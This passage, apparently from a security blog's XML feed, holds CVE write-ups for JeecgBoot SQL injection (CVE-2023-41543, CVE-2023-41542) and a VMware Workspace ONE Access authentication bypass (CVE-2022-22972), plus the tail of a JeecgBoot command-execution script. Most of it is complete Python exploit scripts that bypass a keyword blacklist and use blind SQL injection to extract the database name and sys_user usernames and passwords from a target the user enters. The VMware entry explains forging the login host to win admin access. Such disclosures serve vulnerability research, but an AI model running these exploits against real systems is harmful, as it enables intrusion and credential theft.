class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br>    cmd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your command: &quot;</span>)<br>    invokecmd(url,cmd)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41543(JeecgBoot Sql Injection)</title>
    <link href="/2023/09/18/CVE-2023-41543(JeecgBoot_sql)/"/>
    <url>/2023/09/18/CVE-2023-41543(JeecgBoot_sql)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>JEECG Boot v3.5.3 was discovered to contain a SQL injection in &#x2F;sys&#x2F;replicate&#x2F;check</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：</p><p>“exec|peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;</p><p><img src="/../images/image-20230915140019578.png"></p><p>Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-string">&#x27;having &#123;ascii&#125;=(nullif (ascii (substring ((select database()), &#123;place&#125;, 1)), 0) or&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>The complete utilization script is as follows</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">url,token</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldVal=1&amp;dataId=asd&amp;fieldName=&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    headers[<span class="hljs-string">&quot;X_ACCESS_TOKEN&quot;</span>]=token<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;1   having 32&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;length&#125;</span>,1))),0))   &quot;</span><br>        response=requests.get(url+payload,headers=headers)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;code&quot;</span>]!=<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    database=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;1   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) &quot;</span><br>            response=requests.get(url+payload,headers=headers)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;code&quot;</span>]==<span class="hljs-string">&quot;200&quot;</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        database+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><span class="hljs-comment"># get_database(&quot;http://localhost:8088&quot;,&quot;&quot;)</span><br>url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br>token=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your X_ACCESS_TOKEN: &quot;</span>)<br>get_database(url,token)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-22972(VM_access_Identity_authentication_bypass)</title>
    <link href="/2023/09/18/CVE-2022-22972(VM_access_%20Identity_authentication_bypass)/"/>
    <url>/2023/09/18/CVE-2022-22972(VM_access_%20Identity_authentication_bypass)/</url>
    
    <content type="html"><![CDATA[<h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>VMware is a provider of global desktop to data center virtualization solutions, offering products including our most familiar VMware Workstation, a desktop virtual computing software. The introduction of multiple products involved in this vulnerability is as follows:</p><p>VMware Workspace ONE Access is an intelligent driven digital workspace platform developed by VMware company, which enables easy and secure delivery and management of any application anytime, anywhere on any device. VMware vRealize Automation is an automated deployment solution cloud management platform. VMware Cloud Foundation is a hybrid cloud platform of VMware company. The vRealize Suite Lifecycle Manager is the vRealize Suite lifecycle and content management platform.</p><p>On May 18th, VMware released a notice (VMSA-2022-0014) to address two vulnerabilities in multiple VMware products, including CVE-2022-22972, which has certain flaws in identity authentication processing. Remote attackers can bypass authentication by forging relevant request information, thereby gaining administrative privileges for related applications. </p><h2 id="Utilization-scope"><a href="#Utilization-scope" class="headerlink" title="Utilization scope"></a>Utilization scope</h2><ul><li>VMware Workspace ONE Access 21.08.0.1, 21.08.0.0，20.10.0.1, 20.10.0.0</li><li>VMware Identity Manager（vIDM） 3.3.6, 3.3.5, 3.3.4, 3.3.3</li><li>VMware vRealize Automation(vIDM)  7.6</li><li>VMware Cloud Foundation (vIDM) 4.4, 4.3.x, 4.2.x, 4.1, 4.0.x</li><li>VMware Cloud Foundation (vRA) 3.x</li><li>vRealize Suite Lifecycle Manager(vIDM) 8.x</li></ul><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><h4 id="Environmental-construction"><a href="#Environmental-construction" class="headerlink" title="Environmental construction"></a>Environmental construction</h4><p> Starting from the official website（ <a href="https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&productId=1269">https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&amp;productId=1269</a> ）Download VMware Workspace ONE Access 20.10.0.0 OVA file </p><p> Use VMware Workstation to import OVA files and configure FQDN (set the host name to a random domain name, otherwise an error will be reported when configuring the database in the future) </p><p><img src="/./../images/image-20230918151916932.png" alt="image-20230918151916932"></p><p> After successful import, initialization will occur</p><p><img src="/./../images/image-20230918152059288.png" alt="image-20230918152059288"></p><p> Visit https:&#x2F;&#x2F;&lt;Domain Name: 8443&gt;and follow the prompts to configure your account and database. </p><p><img src="/./../images/image-20230918155350410.png" alt="image-20230918155350410"></p><p>Configure remote debugging </p><p>To build a dynamic debugging environment, it is necessary to save the relevant source code locally and enable remote debugging using IDEA</p><p>The required lib file is located in the&#x2F;usr&#x2F;local&#x2F;horizon&#x2F;lib&#x2F;embeddedauthadapters directory.</p><p><img src="/./../images/image-20230918162425142.png" alt="image-20230918162425142"></p><p> Configure remote debugging for IDEA. </p><p><img src="/./../images/image-20230918162456080.png" alt="image-20230918162456080"></p><p> Then write the remote debugging commands in the box to&#x2F;opt&#x2F;vmware&#x2F;region&#x2F;workspace&#x2F;bin&#x2F;setenv.sh </p><p><img src="/./../images/image-20230918162632302.png" alt="image-20230918162632302"></p><h4 id="Debugging-analysis"><a href="#Debugging-analysis" class="headerlink" title="Debugging analysis"></a>Debugging analysis</h4><p> It can be found through logs that the jar package with vulnerabilities is <code>local-password-auth-adapter-0.1.jar</code></p><p> According to the log records, the specific login used is the com. vmware. horizon. adapters. local. LocalPasswordAuthAdapter # login function </p><p><img src="/./../images/image-20230918163450474.png" alt="image-20230918163450474"></p><p>After obtaining account password and other information, extract the parameter endpoint through the getLocalUrl function</p><p>Follow up on the com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#getLocalUrl</p><p><img src="/./../images/image-20230918163654242.png" alt="image-20230918163654242"></p><p> In the getLocalUrl function, a special HTTPS link class will be constructed for the request, and the actual concatenation result is <code>https://&#123;host&#125;:443/SAAS/API/1.0/REST/auth/local/login</code></p><p> Therefore, we can find that the domain name of this request can be controlled by us </p><p> Then we enter the subsequent authenticate function for identity authentication </p><p><code>com.vmware.horizon.adapters.local.LocalPasswordService#authenticate</code></p><p><img src="/./../images/image-20230918165912570.png" alt="image-20230918165912570"></p><p> Through debugging and judging the logic of the function, we have found that as long as the return value is 200 during a post request, the account password will be considered correct and the login will be successful </p><p> Based on the previous analysis of the getLocalUrl function, we know that the domain name of the request can be controlled by us. Therefore, we only need to build a service and respond with a 200 status code for any request </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/2031/#_1">https://paper.seebug.org/2031/#_1</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>VMware</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41542(JeecgBoot Sql Injection)</title>
    <link href="/2023/09/15/CVE-2023-41542(JeecgBoot_sql)/"/>
    <url>/2023/09/15/CVE-2023-41542(JeecgBoot_sql)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>JEECG Boot v3.5.3 was discovered to contain a SQL injection in &#x2F;jeecg boot&#x2F;jmreport&#x2F;qurestSql</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：</p><p>“exec|peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;</p><p><img src="/../images/image-20230915140019578.png"></p><p>Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-string">&#x27;having &#123;ascii&#125;=(nullif (ascii (substring ((select database()), &#123;place&#125;, 1)), 0) or&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>The complete utilization script is as follows</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">url</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/qurestSql&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># payload = &quot;&quot;&quot;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 106=(nullif(ascii((substring((select database()),1,1))),0)) or     &#x27;&quot;&#125;&quot;&quot;&quot;</span><br>    payload=<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select database()),&#123;length&#125;,1))),0)) or     &#x27;&quot;&#125;&quot;&quot;&quot;</span><br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    database=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select database()),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        database+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(database)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_password</span>(<span class="hljs-params">url</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/qurestSql&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select username from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    username=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select username from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        username+=<span class="hljs-built_in">chr</span>(mid)<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select password from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    password=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select password from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span 